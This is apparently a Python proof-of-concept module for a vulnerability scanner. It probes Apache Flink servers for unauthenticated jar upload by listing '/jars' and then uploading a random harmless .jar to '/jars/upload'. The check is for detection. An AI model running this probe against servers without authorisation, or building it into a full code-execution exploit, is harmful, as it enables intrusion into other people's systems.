# !/usr/bin/env python3
# @Time    : 2020/7/23
# @Author  : caicai
# @File    : poc_apache-flink-upload-rce_2020.py

'''
setup:
https://github.com/Maskhe/vuls/tree/master/apache%20flink/flink%E4%B8%8A%E4%BC%A0jar%E5%AF%BC%E8%87%B4rce

'''
from myscan.lib.parse.response_parser import response_parser  ##写了一些操作resonse的方法的类
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.config import scan_set
from myscan.lib.core.common import get_random_str


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "apache-flink-upload-rce"
        self.vulmsg = "referer:https://github.com/LandGrey/flink-unauth-rce"
        self.level = 2  # 0:Low  1:Medium 2:High

    def verify(self):
        # 根据config.py 配置的深度，限定一下目录深度
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return
        req = {
            "method": "GET",
            "url": self.url + "jars",
            "timeout": 10,
            "allow_redirects": False,
            "verify": False,
        }
        r = request(**req)

        if r != None and r.status_code == 200 and "json" in r.headers.get("Content-Type",
                                                                          "") and b"file" in r.content and b"address" in r.content:
            random_str1, random_str2 = get_random_str(6), get_random_str(6)
            req["method"] = "POST"
            req["url"] = self.url + "jars/upload"
            req["headers"] = {
                "Content-Type": "multipart/form-data;boundary=---------------------------55234769711869310853567253468"
            }
            data = '''-----------------------------55234769711869310853567253468\r\n'''
            data += '''Content-Disposition: form-data; name="fileUpload"; filename="{r1}.jar"\r\n'''.format(
                r1=random_str1)
            data += '''Content-Type: application/octet-stream\r\n\r\n'''
            data += "{r2}\r\n".format(r2=random_str2)
            data += "-----------------------------55234769711869310853567253468--\r\n"
            req["data"] = data
            r = request(**req)

            if r != None and r.status_code == 200 and "json" in r.headers.get("Content-Type",
                                                                              "") and b"success" in r.content and b"filename" in r.content:
                parser_ = response_parser(r)
                self.result.append({
                    "name": self.name,
                    "url": req.get("url"),
                    "level": self.level,  # 0:Low  1:Medium 2:High
                    "detail": {
                        "vulmsg": self.vulmsg,
                        "request": parser_.getrequestraw(),
                        "response": parser_.getresponseraw()
                    }
                })
